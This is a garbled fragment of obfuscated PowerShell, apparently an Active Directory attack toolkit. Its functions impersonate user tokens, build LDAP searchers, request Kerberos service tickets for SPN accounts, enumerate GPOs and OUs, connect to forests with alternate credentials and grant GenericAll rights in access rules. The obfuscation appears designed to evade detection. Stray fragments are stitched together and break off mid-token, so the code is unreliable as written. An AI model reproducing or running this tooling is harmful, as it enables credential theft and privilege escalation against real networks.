                YoV{PIJKROpErIJKTIEs} = YoV{EIJKVEnT}.Z3bpIJKRIJKOperTIEsZ3b
                Switch (YoV{evIJKeNT}.Z3bidZ3b) {
                    
                    4624 {
                        
                        if(-not YoV{pRoPIJKErIJKTIES}[5].Z3bvIJKAlueZ3b.(Z3b{2}{0}{1}Z3b-fS5zsWitS5z,S5zhS5z,S5zEndS5z).Invoke(S5zYoVS5z)) {
                            YoV{oIJKUtPuT} = &(Z3b{0}{1}{2}Z3b-f S5zNew-ObjS5z,S5zeS5z,S5zctS5z) (Z3b{1}{2}{0}Z3b-fS5zctS5z,S5zPSOS5z,S5zbjeS5z) -Property @{
                                (Z3b{3}{2}{0}{1}Z3b -f S5zputerNS5z,S5zameS5z,S5zmS5z,S5zCoS5z)              = YoV{COmPIJKUIJKTeR}
                                (Z3b{3}{2}{0}{1}Z3b -f S5zrS5z,S5zeatedS5z,S5zCS5z,',',S5zlogS5z,S5ztaS5z,S5zGeS5z,S5zorestCS5z) (Z3b{1}{3}{4}{0}{2}Z3b-fS5zlCaS5z,S5zGet-FoS5z,S5ztalogS5z,S5zrestGlS5z,S5zobaS5z)
&(Z3b{1}{0}{2}Z3b-f S5zAS5z,S5zSet-S5z,S5zliasS5z) (Z3b{1}{3}{0}{2}Z3b -f S5zsS5z,S5zGet-NS5z,S5zerS5z,S5zetUS','







function gET-IJKdIJKoMainSIJKeaRcHEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{1}{0}Z3b -f S5zessS5z,S5zdProcS5z,S5zPSShoulS5z}, S5zS5z)]
    [OutputType({Z3b{2}{8}{6}{3}{1}{4}{7}{9}{5}{0}Z3b-fS5zerS5z,S5zerviceS5z,S5zSS5z,S5zrySS5z,S5zs.DirS5z,S5zrySearchS5z,S5zrectoS5z,S5zectS5z,S5zystem.DiS5z,S5zoS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(VaLuEfrOmPIPelInE = YoV{tIJKRUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{domIJKAIJKIn},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}Z3b -f S5zFS5z,S5zlterS5z,S5ziS5z})]
        [String]
        YoV{LdApFIJKIIJKltER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{pIJKRoIJKPeIJKRTIes},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-f S5zADSPaS5z,S5zthS5z})]
        [String]
        YoV{SEIJKAIJKRchBAIJKsE},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{SIJKEarcHbAsIJKepIJKREFIJKIx},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{0}{1}{3}Z3b -f S5zntS5z,S5zrollS5z,S5zDomainCoS5z,S5zerS5z})]
        [String]
        YoV{SeIJKRIJKVEr},

        [ValidateSet({Z3b{0}{1}Z3b-fS5zBaS5z,S5zseS5z}, {Z3b{1}{0}Z3b -fS5zLevelS5z,S5zOneS5z}, {Z3b{0}{1}Z3b -f S5zSuS5z,S5zbtreeS5z})]
        [String]
        YoV{SeaRCHIJKSCoIJKpe} = (Z3b{2}{0}{1}Z3b -fS5ztreS5z,S5zeS5z,S5zSubS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{reSIJKUlIJKTpagIJKEsIJKIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SeRveRIJKTIJKiMELiMit} = 120,

        [ValidateSet({Z3b{0}{1}Z3b -fS5zDS5z,S5zaclS5z}, {Z3b{1}{0}Z3b -f S5zpS5z,S5zGrouS5z}, {Z3b{0}{1}Z3',',S5zeS5z,S5zearS5z,S5zSystem.DS5z,S5ztorySS5z,S5zesS5z,S5z.DirectoryS5z)
        YoV{SIJKEAIJKRcIJKheR}.Z3bSEAIJKRCHRIJKOoTZ3b = YoV{dOIJKmIJKAIn}
        YoV{SIJKeArIJKchIJKer}.Z3bFilTIJKeRZ3b = YoV{fIlIJKTer}
        YoV{sIJKeaRIJKChEr}.Z3bPAIJKGEIJKsIZeZ3b = YoV{pAIJKGeIJKSIze}
        YoV{sEAIJKRCheR}.Z3bSeaRIJKChscIJKoIJKPEZ3b = (Z3b{1}{0}Z3b -fS5zreeS5z,S5zSubtS5z)
  ','S5zUserS5z,S5zImpersonS5z,S5zoggedOnS5z,S5zLS5z).Invoke(YoV{lOGIJKOnIJKTIJKOkENIJKhaNdLe})

    if (-not YoV{reIJKSuLt}) {
        throw Z3b[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: YoV(([ComponentModel.Win32Exception] YoVLastError).Message) Z3b
    }

    &(Z3b{1}{0}{2}Z3b-fS5zrboS5z,S5zWrite-VeS5z,S5zseS5z) (Z3b{9}{1}{0}{3}{5}{11}{10}{16}{14}{8}{7}{13}{6}{2}{15}{12}{4}Z3b -f S5z-UserImpersonationS5z,S5zeS5z,S5zsfS5z,S5z] AS5z,S5zsonatedS5z,S5zlS5z,S5zesS5z,S5z suS5z,S5zlsS5z,S5z[InvokS5z,S5zeS5z,S5ztS5z,S5zlly imperS5z,S5zccS5z,S5zate credentiaS5z,S5zuS5z,S5zrnS5z)
    YoV{LOIJKgIJKONtOkENHaIJKNDIJKLE}
}


function inIJKVoIJKkIJKE-rIJKEVertTOIJKsEIJKLf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        YoV{tOkIJKEIJKNHAndIJKle}
    )

    if (YoV{PIJKSboIJKUnDPArAmEtIJKErS}[(Z3b{0}{2}{1}Z3b -f S5zTS5z,S5zndleS5z,S5zokenHaS5z)]) {
        &(Z3b{0}{2}{1}Z3b-f S5zWriteS5z,S5zrningS5z,S5z-WaS5z) (Z3b{14}{13}{12}{9}{15}{5}{11}{3}{8}{10}{1}{0}{16}{2}{6}{4}{17}{7}Z3b-fS5zn and clS5z,S5zoS5z,S5zLS5z,S5ztoken impersonaS5z,S5zoS5z,S5zf] RS5z,S5zogonUser() tS5z,S5zdleS5z,S5ztS5z,S5ztS5z,S5ziS5z,S5zeverting S5z,S5zrS5z,S5zoke-ReveS5z,S5z[InvS5z,S5zToSelS5z,S5zosing S5z,S5zken hanS5z)
        YoV{rEIJKSuLT} = YoV{kERNIJKEIJKl32}::(Z3b{2}{3}{1}{0}Z3b -fS5zleS5z,S5zoseHandS5z,S5zCS5z,S5zlS5z).Invoke(YoV{TOkIJKenIJKhAnIJKDLe})
    }

    YoV{reIJKSulT} = YoV{adIJKVapIJKi32}::(Z3b{1}{3}{2}{0}Z3b-f S5zelfS5z,S5zRevertS5z,S5zoSS5z,S5zTS5z).Invoke();YoV{lIJKAsIJKTErROr} =   ( &(S5zGIS5z) (S5zVAriAS5z+S5zbLeS5z+S5z:Dsm3S5z)).Z3bVAIJKLueZ3b::(Z3b{5}{1}{3}{2}{0}{4}Z3b-f S5zoS5z,S5zaS5z,S5zWin32ErrS5z,S5zstS5z,S5zrS5z,S5zGetLS5z).Invoke();

    if (-not YoV{REIJKSIJKUlt}) {
        throw Z3b[Invoke-RevertToSelf] RevertToSelf() Error: YoV(([ComponentModel.Win32Exception] YoVLastError).Message) Z3b
    }

    &(Z3b{4}{1}{0}{2}{3}Z3b-fS5zrbS5z,S5zVeS5z,S5zosS5z,S5zeS5z,S5zWrite-S5z) (Z3b{7}{8}{2}{5}{6}{1}{10}{0}{4}{3}{9}{11}Z3b -fS5zucS5z,S5znatioS5z,S5zevertTS5z,S5zreS5z,S5zcessfully S5z,S5zoSelf] Token impeS5z,S5zrsoS5z,S5z[IS5z,S5znvoke-RS5z,S5zverS5z,S5zn sS5z,S5ztedS5z)
}


function get-IJKdIJKOMaINspNTIJKIcIJKkET {


    [OutputType({Z3b{5}{0}{3}{1}{4}{2}{6}Z3b -fS5zrVS5z,S5zwS5z,S5zkeS5z,S5zieS5z,S5z.SPNTicS5z,S5zPoweS5z,S5ztS5z})]
    [CmdletBinding(dEFaUltpArAmeTERsetnAMe = {Z3b{1}{0}Z3b-fS5zNS5z,S5zRawSPS5z})]
    Param (
        [Parameter(POSitIon = 0, ParaMEtERSEtnAmE = Z3bRaWIJKspnZ3b, mAnDaTORy = YoV{TrIJKUe}, ValUefROmPiPeLine = YoV{trIJKUe})]
        [ValidatePattern({Z3b{1}{0}Z3b -fS5z*/.*S5z,S5z.S5z})]
        [Alias({Z3b{2}{5}{3}{1}{0}{4}Z3b -fS5zcipaS5z,S5zinS5z,S5zSS5z,S5zPrS5z,S5zlNameS5z,S5zerviceS5z})]
        [String[]]
        YoV{sIJKPN},

        [Parameter(PositiON = 0, pArAMETersEtnAmE = Z3buIJKS','                          if (YoV{_}.Z3bGpOIJKptIIJKoNsZ3b -eq 1) {
                                YoV{iIJKNhERItANCEDIJKIsIJKAIJKBIJKLEd} = YoV{trIJKUe}
                            }
                        }
                    }
                }

                if (YoV{tARIJKgEtIJKCOmPIJKUTERIJKNamE}) {
                    
                    YoV{coMIJKpUterIJKSIJKiTE} = (&(Z3b{2}{3}{1}{6}{5}{4}{0}Z3b-fS5zNameS5z,S5zNetComputerS5z,S5zGetS5z,S5z-S5z,S5zteS5z,S5ziS5z,S5zSS5z) -ComputerName YoV{TIJKARGIJKEIJKTCIJKOMPUterName}).Z3bSIJKItEnamEZ3b
                    if(YoV{cIJKOMIJKpUTersitE} -and (YoV{COmIJKPUTIJKersIIJKTe} -notlike (Z3b{1}{0}Z3b -f S5zror*S5z,S5zErS5z))) {
                        YoV{SIJKEarIJKCHIJKERaRIJKGUMeIJKNTs}[(Z3b{0}{1}Z3b-f S5zIdS5z,S5ze','      YoV{sIJKEIJKRver},

        [ValidateSet({Z3b{0}{1}Z3b-f S5zBasS5z,S5zeS5z}, {Z3b{1}{0}Z3b-f S5zvelS5z,S5zOneLeS5z}, {Z3b{0}{1}{2}Z3b-fS5zSubS5z,S5ztS5z,S5zreeS5z})]
        [String]
        YoV{sEIJKArCHIJKsCIJKOPe} = (Z3b{2}{1}{0}Z3b-fS5ztreeS5z,S5zbS5z,S5zSuS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{RESulIJKTpagesIJKIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sIJKErVeRtiIJKMElIJKiIJKMIT},

        [ValidateSet({Z3b{0}{1}Z3b -fS5zDacS5z,S5zlS5z}, {Z3b{0}{1}Z3b -f S5zGS5z,S5zroupS5z}, {Z3b{0}{1}Z3b -fS5zNonS5z,S5zeS5z}, {Z3b{','   [ValidateSet({Z3b{1}{0}Z3b -fS5zaseS5z,S5zBS5z}, {Z3b{1}{2}{0}Z3b -fS5z','    [Parameter(pARaMETeRseTNamE = Z3buIJKserIdenTiIJKTYZ3b)]
        [ValidateNotNull','5z,S5zWS5z,S5zseS5z) (S5z[GeS5z+S5zt-DoS5z+S5zmaiS5z+S5znOU] S5z+S5zES5z+S5zxtracS5z+S5zted S5z+S5zdomS5z+S5zaiS5z+S5zn S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfromS5z+S5z S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                        YoV{SeARChIJKeIJKRaRguMEnIJKTS}[(Z3b{2}{1}{0}Z3b-fS5znS5z,S5ziS5z,S5zDomaS5z)] = YoV{IIJKDEntIJKItydIJKOmIJKAin}
                        YoV{ouIJKseARIJKChIJKer} = &(Z3b{0}{2}{3}{1}Z3b -fS5zGet-DomaS5z,S5zarcherS5z,S5ziS5z,S5znSeS5z) @SearcherArguments
                        if (-not YoV{ouSeIJKARcIJKHIJKEr}) {
                            &(Z3b{1}{0}{4}{3}{2}Z3b -fS5zriS5z,S5zWS5z,S5zrningS5z,S5zWaS5z,S5zte-S5z) (S5z[S5z+S5zGeS5z+S5zt-DomaS5z+S5zinOS5z+S5zU] S5z+S5zUnablS5z+S5ze S5z+S5ztS5z+S5zo S5z+S5zretrS5z+S5zievS5z+S5ze S5z+S5zdomS5z+S5zaS5z+S5zin S5z+S5zsearcS5z+S5zheS5z+S5zr S5z+S5zfoS5z+S5zr S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                        }
                    }
                }
                else {
                    try {
                        YoV{gIJKUIJKIdbyTesTRiIJKNg} = (-Join (([Guid]YoV{ideIJKNtITIJKYInsTANIJKCE}).(Z3b{0}{2}{1}{3}Z3b-fS5zTS5z,S5zByteArraS5z,S5zoS5z,S5zyS5z).Invoke() JGO &(Z3b{2}{1}{0}{3}Z3b -f S5zEach-ObS5z,S5zorS5z,S5zFS5z,S5zjectS5z) {YoV{_}.(Z3b{1}{0}{2}Z3b -f S5ziS5z,S5zToStrS5z,S5zngS5z).Invoke(S5zXS5z).(Z3b{2}{0}{1}Z3b-fS5zaS5z,S5zdLeftS5z,S5zPS5z).Invoke(2,S5z0S5z)})) -Replace ((Z3b{1}{0}Z3b-fS5z..)S5z,S5z(S5z)),S5z5rjYoV1S5z
                        YoV{IdIJKeNIJKTIJKItyfiltER} += Z3b(objectguid=YoVGuidByteString)Z3b
                    }
                    catch {
                        YoV{IDeIJKNtIIJKTIJKyfILTER} += Z3b(name=YoVIdentityInstance)Z3b
                    }
                }
            }
            if (YoV{IIJKDenIJKTiIJKTyIJKFiLtER} -and (YoV{idEntiTyFIJKIIJKlIJKTEr}.(Z3b{1}{0}Z3b -fS5zimS5z,S5zTrS5z).Invoke() -ne S5zS5z) ) {
                YoV{fIJKilIJKTER} += Z3b(JGOYoVIdentityFilter)Z3b
            }

            if (YoV{PIJKSBOIJKUNIJKDPArIJKAmETEIJKRS}[(Z3b{0}{1}Z3b -f S5zGPLinS5z,S5zkS5z)]) {
                &(Z3b{0}{2}{1}Z3b-f S5zWrS5z,S5z-VerboseS5z,S5ziteS5z) (S5z[GS5z+S5zeS5z+S5ztS5z+S5z-DomainOS5z+S5zU] S5z+S5zSearcS5z+S5zhingS5z+S5z S5z+S5zforS5z+S5z S5z+S5zOS5z+S5zUs S5z+S5zwithS5z+S5z S5z+Z3bYoVGPLink Z3b+S5zsetS5z+S5z S5z+S5ziS5z+S5zn S5z+S5ztheS5z+S5z S5z+S5zgpLS5z+S5ziS5z+S5znk S5z+S5zpropeS5z+S5zrtyS5z)
                YoV{FIJKilTeR} += Z3b(gplink=*YoVGPLink*)Z3b
            }

            if (YoV{psIJKBOUNIJKdIJKPIJKAraMEIJKTERS}[(Z3b{3}{0}{1}{2}Z3b -fS5zlS5z,S5ztS5z,S5zerS5z,S5zLDAPFiS5z)]) {
                &(Z3b{1}{2}{0}{3}Z3b -fS5zVeS5z,S5zWriteS5z,S5z-S5z,S5zrboseS5z) (S5z[GS5z+S5zet-DS5z+S5zomS5z+S5zainOU]S5z+S5z S5z+S5zUsiS5z+S5zng S5z+S5zadS5z+S5zditioS5z+S5znalS5z+S5z S5z+S5zLDS5z+S5zAP S5z+S5zfS5z+S5zilter:S5z+S5z S5z+Z3bYoVLDAPFilterZ3b)
                YoV{FIJKiIJKlTer} += Z3bYoVLDAPFilterZ3b','5zite-VerboS5z,S5zWrS5z) (S5z[GS5z+S5zeS5z+S5zt-DS5z+S5zomS5z+S5zainS5z+S5zGPO] S5z+S5zUS5z+S5zsing S5z+S5zaS5z+S5zdditiS5z+S5zonalS5z+S5z S5z+S5zLDAS5z+S5zP S5z+S5zfS5z+S5zilter: S5z+Z3bYoVLDAPFilterZ3b)
                    YoV{fiIJKLtIJKer} += Z3bYoVLDAPFilterZ3b
                }

                YoV{GpoSIJKeArchIJKEr}.Z3bfilIJKTERZ3b = Z3b(&(objectCategory=groupPolicyContainer)YoVFilter)Z3b
                &(Z3b{1}{3}{0}{2}Z3b-f S5zitS5z,S5zWS5z,S5ze-VerboseS5z,S5zrS5z) Z3b[Get-DomainGPO] filter string: YoV(YoVGPOSearcher.filter) Z3b

                if (YoV{pIJKsIJKBoUNIJKDPIJKARIJKAmeTers}[(Z3b{0}{1}{2}Z3b -f S5zFiS5z,S5znS5z,S5zdOneS5z)]) { YoV{REsIJKULTS} = YoV{GpoSeIJKARCIJKhER}.(Z3b{2}{0}{1}Z3b-fS5zindOS5z,S5zneS5z,S5zF','   YoV{aDrIJKiIJKgHts} = [System.DirectoryServices.ActiveDirectoryRights] (Z3b{0}{1}{2}Z3b -f S5zExtenS5z,S5zdedRigS5z,S5zhtS5z)
                            YoV{aIJKceS} += &(Z3b{1}{0}{2}Z3b -fS5zw-ObS5z,S5zNeS5z,S5zjectS5z) (Z3b{1}{11}{12}{9}{3}{13}{4}{2}{5}{6}{8}{0}{14}{7}{10}Z3b -fS5zrectS5z,S5zSysS5z,S5zSeS5z,S5zDirS5z,S5zoryS5z,S5zrvicS5z,S5zes.ActiS5z,S5zccessRuS5z,S5zveDiS5z,S5zm.S5z,S5zleS5z,S5ztS5z,S5zeS5z,S5zectS5z,S5zoryAS5z) YoV{idIJKENIJKTIty}, YoV{aDrIIJKgIJKhTS}, YoV{ConTIJKROLtIJKYPe}, YoV{NIJKEwguIJKid}, YoV{INherIJKiTIJKAIJKNIJKCETYPe}
                        }
                    }
                    else {
                        
                        YoV{AIJKDrIgIJKHtS} = [System.DirectoryServices.ActiveDirectoryRights] (Z3b{2}{1}{0}Z3b-f S5zlS5z,S5zlS5z,S5zGenericAS5z)
                        YoV{aCIJKeS} += &(Z3b{1}{0}{2}Z3b -f S5zbjeS5z,S5zNew-OS5z,S5zctS5z) (Z3b{14}{9}{7}{6}{4}{10}{5}{3}{13}{12}{1}{0}{11}{2}{8}Z3b -fS5zccS5z,S5ztoryAS5z,S5zlS5z,S5ztiS5z,S5zrviS5z,S5zs.AcS5z,S5zeS5z,S5z.DirectorySS5z,S5','       [ValidateNotNullOrEmpty()]
        [String]
        YoV{FIJKOIJKREsT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrEIJKdIJKeNtIaL} =   (  &(Z3b{1}{2}{0}Z3b -f S5zlES5z,S5zVAS5z,S5zRiaBS5z)  JFi  -VaLUEONL )::Z3bEIJKmptyZ3b
    )

    PROCESS {
        if (YoV{PIJKsIJKBoUndparIJKAmeTErs}[(Z3b{0}{2}{1}{3}Z3b-fS5zCrS5z,S5zdentiS5z,S5zeS5z,S5zalS5z)]) {

            &(Z3b{3}{1}{0}{2}Z3b-fS5zerbS5z,S5z-VS5z,S5zoseS5z,S5zWriteS5z) (Z3b{4}{11}{2}{0}{7}{12}{6}{5}{9}{10}{1}{8}{3}Z3b -fS5zest] S5z,S5zForS5z,S5z-ForS5z,S5zstS5z,S5z[GeS5z,S5zials forS5z,S5zcredentS5z,S5zUsing alternatS5z,S5zeS5z,S5z GS5z,S5zet-S5z,S5ztS5z,S5ze S5z)

            if (YoV{PSbOUIJKNdpIJKAraIJKmEIJKTErS}[(Z3b{1}{0}Z3b-fS5zstS5z,S5zForeS5z)]) {
                YoV{TIJKArGIJKetFOreST} = YoV{forIJKESt}
            }
            else {
                
                YoV{TaIJKRIJKGEtfOIJKReIJKst} = YoV{cIJKREDentIJKIAl}.(Z3b{3}{1}{2}{0}{5}{4}Z3b-f S5zrS5z,S5zetNeS5z,S5ztwoS5z,S5zGS5z,S5zdentialS5z,S5zkCreS5z).Invoke().Z3bDOmAIJKInZ3b
                &(Z3b{0}{2}{1}{3}Z3b-f S5zWrS5z,S5zte-VerbosS5z,S5ziS5z,S5zeS5z) (S5z[GeS5z+S5zt-ForesS5z+S5zt] S5z+S5zExtracteS5z+S5zdS5z+S5z S5z+S5zdomaiS5z+S5zn S5z+Z3bS5zYoVForestS5z Z3b+S5zfroS5z+S5zm S5z+S5z-CS5z+S5zredeS5z+S5zntiS5z+S5zalS5z)
            }

            YoV{fIJKoreStcOIJKNTeIJKXT} = &(Z3b{1}{2}{0}Z3b -fS5ztS5z,S5zNew-ObjS5z,S5zecS5z) (Z3b{3}{4}{10}{5}{8}{6}{7}{1}{0}{11}{2}{9}{12}Z3b-fS5zctoryS5z,S5zeS5z,S5zryS5z,S5zSysS5z,S5ztS5z,S5zeS5z,S5zvices.ActiveDiS5z,S5zrS5z,S5zrS5z,S5zCS5z,S5zem.DirectorySS5z,S5z.DirectoS5z,S5zontextS5z)((Z3b{1}{0}Z3b -f S5zstS5z,S5zForeS5z), YoV{TIJKARGEIJKTForeSt}, YoV{CREDEnIJKTIIJKAl}.Z3bUsIJKeRNAIJKmeZ3b, YoV{cIJKReDEIJKNtiAl}.(Z3b{3}{1}{0}{5}{4}{2}Z3b-fS5zrS5z,S5ztwoS5z,S5zialS5z,S5zGetNeS5z,S5zedentS5z,S5zkCrS5z).Invoke().Z3bpaIJKssIJKwoRdZ3b)

            try {
                YoV{FOREsIJKTIJKOIJKBjEcT} =   (&(Z3b{2}{1}{0}Z3b -f S5zaBleS5z,S5zeT-VARiS5z,S5zGS5z)  (S5zJ1S5z+S5zfS5z) -Va )::(Z3b{0}{2}{1}Z3b -f S5zGetS5z,S5ztS5z,S5zForesS5z).Invoke(YoV{FOIJKRIJKesIJKTCONteXt})
            }
            catch {
                &(Z3b{3}{2}{0}{1}Z3b -fS5ze-VS5z,S5zerboseS5z,S5zritS5z,S5zWS5z) (S5z[Get-ForS5z+S5zeS5z+S5zsS5z+S5zt]S5z+S5z S5z+S5zTS5z+S5zhe S5z+S5zsS5z+S5zpS5z+S5zecifieS5z+S5zd S5z+S5zforS5z+S5zest S5z+Z3bS5zYoVTargetForestS5z Z3b+S5zdoesS5z+S5z S5z+S5znS5z+S5zot S5z+S5zeS5z+S5zxistS5z+S5z, S5z+S5zcoS5z+S5zuld S5z+S5znS5z+S5zot S5z+S5zbS5z+S5ze S5z+S5zcontaS5z+S5zcS5z+S5zted, S5z+S5ztS5z+S5zhere S5z+(S5ziS5z+S5zsnEF8t S5z).Z3breIJKPLACeZ3b(S5zEF8S5z,[STring][CHaR]39)+S5zaS5z+S5zn S5z+S5zexS5z+S5ziS5z+S5zsting S5z+S5ztruS5z+S5zst,S5z+S5z S5z+S5zoS5z+S5zr S5z+S5ztheS5z+S5z S5z+S5zspeciS5z+S5zfS5z+S5zied S5z+S5zcredentS5z+S5ziS5z+S5zalsS5z+S5z S5z+S5zaS5z+S5zre S5z+S5ziS5z+S5znS5z+S5zvalid: S5z+Z3bYoV_Z3b)
                YoV{nuIJKLl}
            }
        }
        elseif (YoV{pSBOIJKUNIJKDpaIJKRAmETErs}[(Z3b{1}{0}Z3b -f S5zrestS5z,S5zFoS5z)]) {
            YoV{fIJKOrIJKEIJKSTCIJKonText} = &(Z3b{0}{1}{2}Z3b-f S5zNew-ObS5z,S5zjecS5z,S5ztS5z) (Z3b{0}{1}{6}{7}{5}{10}{9}{8}{2}{11}{3}{4}Z3b -fS5zSS5z,S5zystemS5z,S5ztoryCoS5z,S5ztS5z,S5zextS5z,S5ziveDirectorS5z,S5z.DirectoryServiS5z,S5zces.ActS5z,S5zecS5z,S5zrS5z,S5zy.DiS5z,S5znS5z)((Z3b{1}{0}Z3b -f S5zestS5z,S5zForS5z), YoV{forIJKeIJKSt})
            try {
     ','redential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKREDIJKENtIJKIAL} =  YoV{JIJKFi}::Z3bEIJKmPTyZ3b
    )

    BEGIN {
        YoV{sIJKEarChIJKErArgIJKUIJKMenIJKTs} = @{}
        YoV{sIJKEAIJKRCHIJKEIJKRaRgUmEnTs}[(Z3b{2}{0}{1}Z3b -f S5zteS5z,S5zrS5z,S5zLDAPFilS5z)] = ((Z3b{2}{0}{1}Z3b-f S5zemS5z,S5zber=*)S5z,S5z(mS5z))
        if (YoV{PIJKsBIJKouIJKNIJKDPARamIJKETErs}[(Z3b{0}{1}Z3b-f S5zDomS5z,S5zainS5z)]) { YoV{sIJKEIJKArCheRIJKArgumeNIJKTS}[(Z3b{1}{0}Z3b -fS5zmainS5z,S5zDoS5z)] = YoV{DOmIJKAIn} }
        if (YoV{pSIJKBIJKOUndpARAmeteIJKRS}[(Z3b{1}{2}{0}Z3b-fS5ztiesS5z,S5zProS5z,S5zperS5z)]) { Yo','z)]) { YoV{comPuTErIJKseIJKARCIJKherIJKAIJKRGIJKUIJKMIJKeNTs}[(Z3b{0}{3}{1}{2}Z3b -fS5zSearchSS5z,S5zoS5z,S5zpeS5z,S5zcS5z)] = YoV{SEarIJKcIJKhscIJKOPe} }
        if (YoV{PIJKSbOUIJKNIJKdIJKPArameTerS}[(Z3b{2}{1}{0}Z3b -f S5zageSizeS5z,S5zltPS5z,S5zResuS5z)]) { YoV{cOMIJKpUtERSEARCHerAIJKRIJKgIJKUmeIJKNts}[(Z3b{2}{1}{0}Z3b -f S5zizeS5z,S5zsultPageSS5z,S5zReS5z)] = YoV{resUltIJKpaGEsIJKiZe} }
        if (YoV{pSBOIJKUNdpAIJKRameTIJKErS}[(Z3b{2}{0}{1}{3}Z3b-fS5zrTiS5z,S5zmeLimiS5z,S5zServeS5z,S5ztS5z)]) { YoV{CoIJKMPUtEIJKRSeARchIJKErARIJKgUMeIJKNtS}[(Z3b{2}{0}{3}{1}Z3b -f S5zeS5z,S5zimeLimitS5z,S5zSS5z,S5zrverTS5z)] = YoV{SERVErTIIJKmEIJKlIJKiIJK','b-f S5zjS5z,S5zNS5z,S5zectS5z,S5zew-ObS5z) (Z3b{7}{1}{15}{10}{6}{8}{2}{12}{9}{11}{5}{3}{0}{14}{4}{13}{16}Z3b -fS5zSS5z,S5zdS5z,S5z.Tokens.KerS5z,S5zstorS5z,S5zityTokS5z,S5zueS5z,S5zeS5z,S5zSystem.IS5z,S5zlS5z,S5zerosS5z,S5zModS5z,S5zReqS5z,S5zbS5z,S5zeS5z,S5zecurS5z,S5zentityS5z,S5znS5z) -ArgumentList YoV{UIJKSEIJKRspN}
            }
            catch {
                &(Z3b{1}{0}{2}{3}Z3b -f S5zrnS5z,S5zWrite-WaS5z,S5zinS5z,S5zgS5z) (S5z[Get-DoS5z+S5zmainSPNTS5z+S5zicketS5z+S5z] S5z+S5zErroS5z+S5zr S5z+S5zrS5z+S5zequesS5z+S5zting S5z+S5zticS5z+S5zket S5z+S5zfS5z+S5zor S5z+S5zSS5z+S5zPN S5z+Z3bS5zYoVUserSPNS5z Z3b+S5zfS5z+S5zrom S5z+S5zuserS5z+S5z S5z+Z3bS5zYoVDistinguishedNameS5z Z3b+S5z: S5z+Z3bYoV_Z3b)
            }
     ',') @CommonArguments -ResolveMembersToSIDs JGO &(Z3b{4}{2}{1}{0}{3}Z3b -f S5zbjeS5z,S5z-OS5z,S5zhS5z,S5zctS5z,S5zForEacS5z) {
            YoV{gPIJKoIJKgrOUp} = YoV{_}
            
         ','5zgeS5z) -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Z3bDIJKoMIJKAInZ3b, YoV{coNnEIJKcIJKTTaRGIJKET})
            }
        }
       ','GO &(Z3b{3}{4}{2}{1}{0}Z3b-f S5zjectS5z,S5zect-ObS5z,S5zlS5z,S5zSS5z,S5zeS5z) -ExpandProperty (Z3b{0}{1}Z3b-fS5zNaS5z,S5zmeS5z)
 ','irectoryRightS5z,S5zActiS5z) YoV{AIJKcl}.Z3baCtivEDIJKireCIJKToRIJKyRiIJKgHIJKTsZ3b
            YoV{GIJKpOIJKACL}
        }
        }
    }
}











YoV{mIJKod} = &(Z3b{3}{2}{0}{1}Z3b -fS5zw-InMemoryModulS5z,S5zeS5z,S5zeS5z,S5zNS5z) -ModuleName (Z3b{1}{0}Z3b -fS5z2S5z,S5zWin3S5z)




YoV{SAMACCounIJKTTIJKyPIJKeeNUm} = &(Z3b{0}{1}Z3b-fS5zpS5z,S5zsenumS5z) YoV{mIJKOD} (Z3b{2}{5}{1}{0}{4}{3}Z3b -fS5zew.SamS5z,S5ziS5z,S5zPS5z,S5zypeEnumS5z,S5zAccountTS5z,S5zowerVS5z) (Z3b{1}{0}{2}Z3b-f S5znS5z,S5zUIS5z,S5zt32S5z) @{
    (Z3b{3}{0}{1}{2}Z3b -fS5zBS5z,S5zJECS5z,S5zTS5z,S5zDOMAIN_OS5z)                   =   (Z3b{1}{0}{2}Z3b -f S5zx000000S5z,S5z0S5z,S5z00S5z)
    (Z3b{3}{2}{1}{0}Z3b-f S5zTS5z,S5zBJECS5z,S5zP_OS5z,S5zGROUS5z)                    =   (Z3b{2}{0}{1}Z3b -fS5z00000S5z,S5z0S5z,S5z0x10S5z)
    (Z3b{4}{2}{0}{1}{3}Z3b-fS5zROUPS5z,S5z_OBJS5z,S5z_SECURITY_GS5z,S5zECTS5z,S5zNONS5z)       =   (Z3b{0}{2}{1}Z3b-f S5z0S5z,S5z0000001S5z,S5zx1S5z)
    (Z3b{2}{0}{1}{3}Z3b-f S5zIASS5z,S5z_OBJECS5z,S5zALS5z,S5zTS5z)                    =   (Z3b{1}{0}{2}Z3b -fS5z200000S5z,S5z0xS5z,S5z00S5z)
    (Z3b{4}{3}{1}{0}{2}Z3b -fS5zAS_OBJS5z,S5zIS5z,S5zECTS5z,S5z_SECURITY_ALS5z,S5zNONS5z)       =   (Z3b{2}{1}{3}{0}Z3b -f S5z001S5z,S5z200S5z,S5z0xS5z,S5z00S5z)
    (Z3','tem.DireS5z,S5zSyS5z,S5zes.ActiveDirectoS5z,S5zyServiS5z,S5zleS5z,S5zryAuditRuS5z,S5zctorS5z) -ArgumentList YoV{iDeNtIJKiIJKTy}, YoV{AIJKdRIIJKGHt}, YoV{aUIJKDitFIJKlAG}, YoV{OBIJKJeCIJKTIJKTyPe}, YoV{InhIJKErIJKIIJKTAnceTYIJKPe}, YoV{INHIJKEriIJKTIJKEDOIJKBJECIJKTtYPe}
            }

        }
        else {

